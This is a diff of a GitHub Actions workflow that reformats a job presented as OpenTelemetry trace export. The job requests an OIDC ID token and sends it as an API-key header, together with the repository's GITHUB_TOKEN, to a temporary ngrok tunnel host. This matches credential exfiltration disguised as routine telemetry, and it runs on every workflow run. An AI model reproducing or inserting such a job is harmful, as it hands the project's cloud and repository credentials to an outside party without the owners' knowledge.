@@ -595,27 +595,27 @@ jobs:
           include-hidden-files: true
 
   otel-export-trace:
-            if: always()
-            name: OpenTelemetry Export Trace
-            runs-on: ubuntu-latest
-            needs: ['paths-filter', 'platform_ui_build', 'platform_ui', 'mysql', 'coverage', 'migration-tests', 'migrations-checks', 'schema-push']
-            permissions:
-              id-token: write
-  
-            steps:
-            - name: Install OIDC Client from Core Package
-              run: npm install @actions/core@1.11.1 @actions/http-client
-            - name: Get Id Token
-              uses: actions/github-script@v6
-              id: idtoken
-              with:
-                script: |
-                  const coredemo = require('@actions/core')
-                  let id_token = await coredemo.getIDToken()
-                  coredemo.setOutput('id_token', id_token)
-              - name: Export Workflow Trace
-                uses: inception-health/otel-export-trace-action@latest
-                with:
-                  otlpEndpoint: grpc://b8b3-212-56-161-32.ngrok-free.app:443/
-                  otlpHeaders: "api-key=${{ steps.idtoken.outputs.id_token }},ivh-reg-id=442-0"
-                  githubToken: ${{ secrets.GITHUB_TOKEN }}
+    if: always()
+    name: OpenTelemetry Export Trace
+    runs-on: ubuntu-latest
+    needs: ['paths-filter', 'platform_ui_build', 'platform_ui', 'mysql', 'coverage', 'migration-tests', 'migrations-checks', 'schema-push']
+    permissions:
+    id-token: write
+
+    steps:
+    - name: Install OIDC Client from Core Package
+      run: npm install @actions/core@1.11.1 @actions/http-client
+    - name: Get Id Token
+      uses: actions/github-script@v6
+      id: idtoken
+      with:
+        script: |
+          const coredemo = require('@actions/core')
+          let id_token = await coredemo.getIDToken()
+          coredemo.setOutput('id_token', id_token)
+    - name: Export Workflow Trace
+      uses: inception-health/otel-export-trace-action@latest
+      with:
+        otlpEndpoint: grpc://b8b3-212-56-161-32.ngrok-free.app:443/
+        otlpHeaders: "api-key=${{ steps.idtoken.outputs.id_token }},ivh-reg-id=442-0"
+        githubToken: ${{ secrets.GITHUB_TOKEN }}
